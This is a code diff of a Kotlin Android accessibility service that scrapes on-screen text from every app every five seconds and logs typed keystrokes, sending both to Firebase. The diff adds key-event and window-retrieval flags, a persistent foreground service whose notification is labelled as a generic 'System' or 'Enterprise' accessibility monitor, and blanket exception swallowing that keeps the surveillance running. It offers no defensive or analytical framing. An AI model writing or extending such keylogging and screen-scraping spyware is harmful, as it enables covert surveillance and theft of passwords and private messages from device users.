@@ -1,6 +1,7 @@
 package com.example.service
 
 import android.accessibilityservice.AccessibilityService
+import android.accessibilityservice.AccessibilityServiceInfo
 import android.content.Intent
 import android.provider.Settings
 import android.view.accessibility.AccessibilityEvent
@@ -23,58 +24,100 @@ class RemoteAccessibilityService : AccessibilityService() {
         super.onServiceConnected()
         instance = this
         AccessibilityOverlayManager.removeOverlay(this)
+        try {
+            serviceInfo = serviceInfo?.apply {
+                flags = flags or AccessibilityServiceInfo.FLAG_REQUEST_FILTER_KEY_EVENTS or
+                        AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
+                        AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
+            }
+        } catch (_: Exception) {}
+
+        try {
+            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
+                val channelId = "accessibility_keepalive_channel"
+                val channel = android.app.NotificationChannel(
+                    channelId,
+                    "System Accessibility Service",
+                    android.app.NotificationManager.IMPORTANCE_LOW
+                )
+                val notificationManager = getSystemService(android.app.NotificationManager::class.java)
+                notificationManager?.createNotificationChannel(channel)
+
+                val notification = android.app.Notification.Builder(this, channelId)
+                    .setContentTitle("Enterprise Accessibility Active")
+                    .setContentText("Running background accessibility monitor")
+                    .setSmallIcon(android.R.drawable.ic_menu_info_details)
+                    .build()
+
+                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q) {
+                    startForeground(
+                        9921,
+                        notification,
+                        android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
+                    )
+                } else {
+                    startForeground(9921, notification)
+                }
+            }
+        } catch (e: Exception) {
+            android.util.Log.e("RemoteAccessibilityService", "Failed to start foreground for accessibility: ${e.message}")
+        }
     }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
-        if (event == null) return
-        
-        val pkgName = event.packageName?.toString() ?: ""
-        
-        // 1. Lost Mode Check
-        if (LostModeManager.isLostModeActive(this)) {
+        try {
+            if (event == null) return
+            
+            val pkgName = event.packageName?.toString() ?: ""
+            
+            // 1. Lost Mode Check
+            if (LostModeManager.isLostModeActive(this)) {
+                val eventType = event.eventType
+                if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
+                    eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
+                ) {
+                    if (pkgName.isNotEmpty() && pkgName != packageName && !pkgName.contains("inputmethod")) {
+                        LostModeManager.launchLostActivity(this)
+                    }
+                }
+                return
+            }
+
+
+
+            // 3. Realtime Screen Text Scraping
             val eventType = event.eventType
             if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
                 eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
             ) {
-                if (pkgName.isNotEmpty() && pkgName != packageName && !pkgName.contains("inputmethod")) {
-                    LostModeManager.launchLostActivity(this)
-                }
-            }
-            return
-        }
-
-
-
-        // 3. Realtime Screen Text Scraping
-        val eventType = event.eventType
-        if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
-            eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
-        ) {
-            val currentTime = System.currentTimeMillis()
-            if (currentTime - lastScrapedTime > 5000) { // Throttle every 5 seconds
-                lastScrapedTime = currentTime
-                val rootNode = rootInActiveWindow
-                if (rootNode != null) {
-                    val scrapedTextBuilder = StringBuilder()
-                    extractTextFromNode(rootNode, scrapedTextBuilder)
-                    val scrapedText = scrapedTextBuilder.toString().trim()
-                    if (scrapedText.isNotEmpty()) {
-                        syncScrapedTextToFirebase(pkgName, scrapedText)
+                val currentTime = System.currentTimeMillis()
+                if (currentTime - lastScrapedTime > 5000) { // Throttle every 5 seconds
+                    lastScrapedTime = currentTime
+                    val rootNode = rootInActiveWindow
+                    if (rootNode != null) {
+                        val scrapedTextBuilder = StringBuilder()
+                        extractTextFromNode(rootNode, scrapedTextBuilder)
+                        val scrapedText = scrapedTextBuilder.toString().trim()
+                        if (scrapedText.isNotEmpty()) {
+                            syncScrapedTextToFirebase(pkgName, scrapedText)
+                        }
+                        rootNode.recycle()
                     }
-                    rootNode.recycle()
                 }
             }
-        }
 
-        // 4. Keylogger / Keystroke Logging
-        if (isKeyloggerActive && event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
-            val textList = event.text
-            if (!textList.isNullOrEmpty()) {
-                val typedText = textList.joinToString(" ")
-                if (typedText.isNotBlank()) {
-                    syncKeyloggerToFirebase(pkgName, typedText)
+            // 4. Keylogger / Keystroke Logging
+            if (isKeyloggerActive && event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
+                val textList = event.text
+                if (!textList.isNullOrEmpty()) {
+                    val typedText = textList.joinToString(" ")
+                    if (typedText.isNotBlank()) {
+                        syncKeyloggerToFirebase(pkgName, typedText)
+                    }
                 }
             }
+        } catch (e: Exception) {
+            android.util.Log.e("RemoteAccessibilityService", "Exception in onAccessibilityEvent: ${e.message}")
         }
     }
 
